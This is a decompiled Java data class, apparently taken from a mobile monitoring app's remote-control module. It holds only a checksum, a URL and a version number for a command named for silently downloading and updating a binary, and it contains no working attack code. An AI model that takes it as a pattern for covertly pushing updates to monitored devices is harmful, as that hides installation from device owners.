package com.vvt.remotecontrol.input;

import java.io.Serializable;

public class RmtCtrlInputDownloadBinaryAndUpdateSilentMode implements Serializable {
  private static final long serialVersionUID = 7491716244575293275L;
  private String mChecksum;
  private String mUrl;
  private String mVersionNumber;

  public String getChecksum()
  {
    return this.mChecksum;
  }

  public String getUrl()
  {
    return this.mUrl;
  }

  public String getVersionNumber()
  {
    return this.mVersionNumber;
  }

  public void setChecksum(String paramString)
  {
    this.mChecksum = paramString;
  }

  public void setUrl(String paramString)
  {
    this.mUrl = paramString;
  }

  public void setVersionNumber(String paramString)
  {
    this.mVersionNumber = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputDownloadBinaryAndUpdateSilentMode.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */